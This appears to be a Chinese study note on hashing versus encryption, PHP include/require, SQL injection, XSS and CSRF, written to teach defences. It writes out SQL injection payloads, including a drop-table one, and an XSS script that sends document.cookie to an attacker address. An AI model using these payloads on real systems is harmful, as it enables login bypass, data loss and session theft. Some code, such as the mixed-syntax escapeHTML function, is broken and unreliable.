## 請說明雜湊跟加密的差別在哪裡，為什麼密碼要雜湊過後才存入資料庫

這兩個最大的差別是：**可不可以從結果逆推回去**


### Whta is 加密？

簡單來說，想要把一個東西加密就需要一把 key（金鑰）。還沒被加密之前叫做「明文」，加密後叫做「密文」。

有一個大家都知道的加密法就是「凱薩加密」，相信做過 LIOJ 的人都知道它什麼，這邊就不多解釋。

總之呢，決定每個字母要**位移多少**的這個資訊就是「key」，所以來看個例子：

```js
// 實作凱薩加密的 function
function caesarCipher(s, n) {
  let result = ''
  for(let i=0; i<s.length; i++) {
    // 空格
    if (s[i] === ' ') {
      result += ' '
      continue
    }
    // 取得 ASCII CODE
    const code = s.charCodeAt(i)
    // code + 實際的位移量
    let m = code + (n % 26)
    // 如果超出範圍 
    if(m > 122) {
      // 取餘數，並加上 96，因為 a 從 97 開始
      m = (m % 122) + 96
    }
    // 轉回文字
    result += String.fromCharCode(m)
  }
  return result
}
const planText = 'How are you';
const ciperText = caesarCipher(planText, 10);
// Ryg kbo iye
console.log(ciperText);
```

重點來了，只要我知道 key 是 10，就可以把 `Ryg kbo iye` 都往後退 10 位得出明文 `How are you`（雖然以這個例子來說就算不知道 key 也能用暴力解推出來）。

**所以加密是可以逆推的**，這也是加密最大的問題，只要 key 被偷走，那麼不管加密演算法有多厲害都毫無意義。

所以之後又演變出「對稱式加密」與「非對稱式加密」來解決 key 被偷的問題，但這有點拉太遠了，想知道細節的話可以參考我寫的文章：[Encode、Encrypt 跟 Hash 的差別](https://jubeatt.github.io/2022/02/08/what-are-encoding-encrypt-and-hashing/#%E5%B0%8D%E7%A8%B1%E5%BC%8F%E5%8A%A0%E5%AF%86%E8%88%87%E9%9D%9E%E5%B0%8D%E7%A8%B1%E5%BC%8F%E5%8A%A0%E5%AF%86)


### What is 雜湊？

雜湊跟加密有點像，也是把一個東西丟到黑盒子裡面蹦出一個結果。但雜湊獨特的地方在於**沒辦法從結果逆推回去**。

舉例來說，我有一個雜湊函式長這樣：

```js
function hash(n) {
  return n % 1000;
}

console.log(hash(1001)) // 1
console.log(hash(1002)) // 2
console.log(hash(2001)) // 1
console.log(hash(2002)) // 2
```

看出一些端倪了嗎？`1001` 和 `2001` 雜湊後的值都是 1，`2001` 和 `2002` 都是 2。這代表什麼？

試著想想看，在你只知道 1 的時後，要怎麼知道原本是 `1001` 還是 `2001`，或甚至 `3001`？這個就是雜湊最大的特點：

> 無限的輸入，對應有限的輸出。

可以丟到 `hash` 裡面的數字有無限種可能，但出來的雜湊值是有限的，所以你很難很難很難從結果來逆推回去。

除此之外，雜湊也可以保證輸入 A 得到 B，結果保證不變。（基於這一點我們才能用雜湊值來檢查原本的輸入值）

順道一提，像上面**不同的輸入得到相同的輸出**叫做「碰撞」，不過發生的機率很小很小，所以大部分情況可以忽略。

不過雜湊也不是完全沒有破綻，駭客還是可以透過「查表」的方式來破解，例如說：

```js
hash('A') => 'jqiwoejoi123112o4'
hash('AB') => 'ie9i123joiqwot12' 
```

駭客只要把每個輸入會吐出的雜湊值記起來，就可以用查表的方式來看出原本的輸入值是什麼，例如 `jqiwoejoi123112o4` 就代表輸入是 `A`，以此類推。所以又延伸了出了一種做法叫做「加鹽（Salt）」，簡單來說就是**先加料，再雜湊**：

```js
salt('A') => 'QAQ'
hash('QAQ') => '@#(*wjeih98213@*#(Q&#'
```

這樣就算駭客知道 `@#(*wjeih98213@*#(Q&#` 對應到 `QAQ`，也很難猜出加鹽前的輸入長怎麼樣，因為：

1. 不知道鹽加在哪裡（有可能是前面、後面或中間）
2. 不知道加的鹽是什麼

提這個只是想做點小補充，因為這還蠻有趣的。

### 總結

總而言之，加密跟雜湊都是為了「安全性」而產生的機制，兩個有不同的適用情境，像**需要知道原文是什麼**的時後比較適合用加密，而**只需要知道輸入是否符合**的時候就比較適合用雜湊。

例如說，小明想跟小美講悄悄話的話就得用加密，這樣雙方才有辦法知道對方原本說了什麼（用 key 來解密），可是密碼驗證就不需要，因為我只想確定你的輸入是否符合，內容是什麼不重要，所以用雜湊比較適合。

至於為什麼密碼要雜湊後再存入資料庫？理由顯而易見，當然是為了安全性的關係，不然哪天資料庫被駭了就 GG 了。





## `include`、`require`、`include_once`、`require_once` 的差別

在網路上爬了一些文章發現內容都是錯的，先釐清幾個錯誤觀念

1. `require` 不能用迴圈

```php
$i = 1;
while ($i <= 3) {
  require("./a_$i.php");
  $i++;
}

echo '第一支檔案' . $a_1 . '<br>';
echo '第二支檔案' . $a_2 . '<br>';
echo '第三支檔案' . $a_3 . '<br>';
```

其實是 OK 的，我實測的結果如下：

```
第一支檔案a_1
第二支檔案a_2
第三支檔案a_3
```

2. `require` 不能用 `if else` 做流程判斷

```php
$is_true = TRUE;
if ($is_true) {
  require("./a_1.php");
  echo $a_1;
} else {
  require("./a_2.php");
  echo $a_2;
}
```

這一樣也可以，實測結果：

```php
a_1
```

### 真正的差別

真正的差別在於，如果去引入**不存在的檔案**，`include` 會噴 Warning，`require` 會噴 Fatal error。而 Waning 跟 Fatal error 的差別是**會不會繼續往下執行程式碼**，前者會，後者不會，就這麼簡單。


1. require 不存在的檔案

```php
require('./a_12345.php'); // 不存在的檔案
echo 'test';
```

輸出結果：

```php
Warning: require(./a_12345.php): Failed to open stream: No such file or directory in C:\xampp\htdocs\peanu\real-blog\main.php on line 4

Fatal error: Uncaught Error: Failed opening required './a_12345.php' (include_path='C:\xampp\php\PEAR') in C:\xampp\htdocs\peanu\real-blog\main.php:4 Stack trace: #0 {main} thrown in C:\xampp\htdocs\peanu\real-blog\main.php on line 4
```

2. include 不存在的檔案

```php
include('./a_12345.php'); // 不存在的檔案
echo 'test';
```

輸出結果：

```php
Warning: include(./a_12345.php): Failed to open stream: No such file or directory in C:\xampp\htdocs\peanu\real-blog\main.php on line 4

Warning: include(): Failed opening './a_12345.php' for inclusion (include_path='C:\xampp\php\PEAR') in C:\xampp\htdocs\peanu\real-blog\main.php on line 4
test // <--- 有往下執行
```

眼尖的話會發現兩個都是先噴 Warning，接著才決定要噴 Warning 還是 Fatal error。

關於這部分節錄一下[文件](https://www.php.net/manual/en/function.include.php)的解釋：

> Files are included based on the file path given or, if none is given, the include_path specified. If the file isn't found in the include_path, include will finally check in the calling script's own directory and the current working directory before failing. The include construct will emit an E_WARNING if it cannot find a file; this is different behavior from require, which will emit an E_ERROR.

> Note that both include and require raise additional E_WARNINGs, if the file cannot be accessed, before raising the final E_WARNING or E_ERROR, respectively.


意思應該是說一開始會從我們給的路徑裡去找檔案，如果找不到的話 PHP 會從 `include_path` 給的值去找，如果還是找不到，會到目前執行腳本的資料夾再找一次，如果最後最後都還是找不到，`include` 就噴 Warning，`require` 就噴 Fatal Error。

所以上面的錯誤訊息才會有這一段：


```php
Failed opening './a_12345.php' for inclusion (include_path='C:\xampp\php\PEAR') in C:\xampp\htdocs\peanu\real-blog\main.php on line 4
```

另外就是不管最後是 Warning 還是 Fatal Error 在那之前都會先噴一個 Warning，所以才會看到兩個都有 Warning。



總結來說，如果程式**一定要依賴 require 進來的東西**來執行，最好是用 `require`，這樣讀檔失敗的時候就會直接停止，但如果是可有可無的話就能用 `include`，來確保程式不會跑到一半就被中斷。


### 有沒有 once 的差別

就是**會不會重複引入**而已，例如說：

1. 沒有 once

```php
// a_1.php
<?php
  $a_1 = 'a_1';
  echo $a_1 . '<br>';
?>

// main.php
<?php
  include('./a_1.php');
  include('./a_1.php');
  include('./a_1.php');
?>  
```

輸出結果：

```
a_1
a_1
a_1
```

2. 有 once

```php
// a_1.php
<?php
  $a_1 = 'a_1';
  echo $a_1 . '<br>';
?>

// main.php
<?php
  include_once('./a_1.php');
  include_once('./a_1.php');
  include_once('./a_1.php');
?>  
```

輸出結果：

```
a_1
```





## 請說明 SQL Injection 的攻擊原理以及防範方法

簡單來說就是「把原本的 SQL 扭曲成別的意思」，例如說要驗證帳號密碼的 SQL 可能長這樣：

```sql
SELECT * FROM users WHERE username='peanu' AND password=12345; 
```
如果找的到東西就代表是正確的，不然就是錯的，聽起來很合理。但問題是這裡用的是「字串拚接」，而 `username` 和 `password` 的值都是由**使用者來輸入的**，這就代表使用者也可以輸入 SQL 來改變原本的意思。

例如說，當使用者在 username 的欄位輸入 `' or 1=1 #` 時 SQL 會變這樣：

```sql
SELECT * FROM users WHERE username='' or 1=1 # AND password=12345;
```

`#` 在 SQL 裡代表註解，所以後面的 `AND password=12345` 等於直接被忽略掉，而 `or 1=1` 永遠是 true，所以即便沒有 `username=''` 條件也會成立，然後就列出所有 users 的欄位了。 

這樣聽起來可能沒什麼，但如果是這樣呢：`' or 1=1; drop table users #`：

```sql
SELECT * FROM users WHERE username='' or 1=1; drop table users # AND password=12345;
```

如果你不知道這段在幹嘛的話，直接拿去資料庫跑跑看，就知道什麼叫做**真的 GG 了**。

### 防範方法

既然問題出在**使用者的輸入**，那解法也很簡單，只要把**所有使用者的輸入內容都先做過濾**就可以了。

PHP 有提供內建函式來處理，寫起來大概長這樣：

```php
<?php
  // 先準備好 sql，參數的部分改用 ? 這個 placeholder 來代替
  $sql = "INSERT INTO comments(`nickname`, `content`) VALUES (?, ?)";
  // 接著把 sql 指令丟到 prepare()，進入準備階段
  $stmt = $conn->prepare($sql);
  // 接著把值做綁定（綁定階段），'ss' 是代表兩個參數都是 string
  $stmt->bind_param('ss', $nickname, $content);
  // 到這邊才是真的執行 sql
  $result = $stmt->execute();
?>
```

這樣子就算碰到剛剛的惡意輸入也只會被當成「純字串」來執行，可喜可賀，可喜可賀。

最後附上一下我寫的文章，如果你好奇 SQL Injection 還可以怎麼玩的話可以參考看看：[用 SQL Injection 來玩壞資料庫](https://jubeatt.github.io/2022/02/09/what-is-sql-injection/)


##  請說明 XSS 的攻擊原理以及防範方法

XSS（Cross Site Scripting）用白話來說就是**在別人的網站上執行腳本**，跟 SQL Injection 的概念有點類似，一樣是使用者輸入惡意內容來執行做壞事。

最簡單的例子是這個：

```php
// $nickname = <script>alert("hihihi")</script>
$nickname = $row['nickname'];
echo $nickname;
```
只要到了會顯示 `$nickname` 的網站，就會跳出 `alert` 視窗，這就是最基本的 XSS。

但如果你懂 JavaScript 的話就知道可以做的事情有一大堆，例如：

1. 存取 cookie

```php
// $nickname = <script>alert(document.cookie)</script>
$nickname = $row['nickname'];
echo $nickname;
```

2. 重新導向

```php
// $nickname = <script>document.Location="https://google.com"</script>
$nickname = $row['nickname'];
echo $nickname;
```

只要發揮一點想像力，就可以在你完全不知道的情況下偷走你的 cookie：

```js
// 駭客想要送到的地方
let address = "http://localhost:5000";
// 建立 <img>
let img = document.createElement("img");
// 存取 cookie 的代碼
let cookie = document.cookie;
// 設定 <img src="http://localhost:5000?cookie=value">
img.setAttribute("src", `${address}/?cookie=${encodeURIComponent(cookie)}`);
// 插到 DOM 裡面
document.body.appendChild(img);
```

如果你好奇實際上長什麼樣，可以參考我寫的文章：[從玩壞自己的網站來學習 XSS](http://localhost:4000/2022/02/09/what-is-xss/#:~:text=%E6%97%A2%E7%84%B6%20document.cookie%20%E5%8F%AF%E4%BB%A5%E5%AD%98%E5%8F%96%E3%80%8C%E4%BD%BF%E7%94%A8%E8%80%85%E5%9C%A8%E9%80%99%E5%80%8B%E7%B6%B2%E7%AB%99%E5%84%B2%E5%AD%98%E7%9A%84%20cookie%E3%80%8D%EF%BC%8C%E9%82%A3%E9%BA%BC%E5%8F%AA%E8%A6%81%E7%99%BC%E6%8F%AE%E3%80%8C%E5%89%B5%E6%84%8F%E3%80%8D%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%8A%8A%20cookie%20%E9%80%81%E5%88%B0%E9%A7%AD%E5%AE%A2%E6%83%B3%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%88%E7%95%B6%E6%88%91%20foodpanda%EF%BC%9F%EF%BC%89%EF%BC%8C%E4%BE%8B%E5%A6%82%E8%AA%AA%EF%BC%9A)

以上就是 XSS 的攻擊方式及原理。

### 防範方法

因為問題跟 SQL Injection 一樣都是出在**使用者的輸入**，所以解法也一樣：**先過濾，在輸出**，就可以解決了。 

PHP 一樣有提供內建函式可以處理：

```php
// 變成純字串
$nickname = htmlspecialchars($row['nickname']);
echo $nickname;
```

或要自己寫一個 function 也行：

```php
/* 把 < > @ ' " 都做字元跳脫 */
function escapeHTML($unsafe) {
  return $unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/'/g, '&#039;')
    .replace(/"/g, '&quot;')
}
```

總之，這樣的輸出值都會是純字串，不會再被解析成程式碼。


## 請說明 CSRF 的攻擊原理以及防範方法

簡單來說就是利用「使用者的登入狀態」來發出偽造的 request。

防範方法有很多種，但最保險的做法應該是用 Chrome 提供的 SameSite 來設定 cookie。

關於 CSRF 我還不太熟，但我有寫一篇文章來紀錄，有興趣可以參考看看：[認識 CSRF](https://jubeatt.github.io/2022/02/22/what-is-csrf/)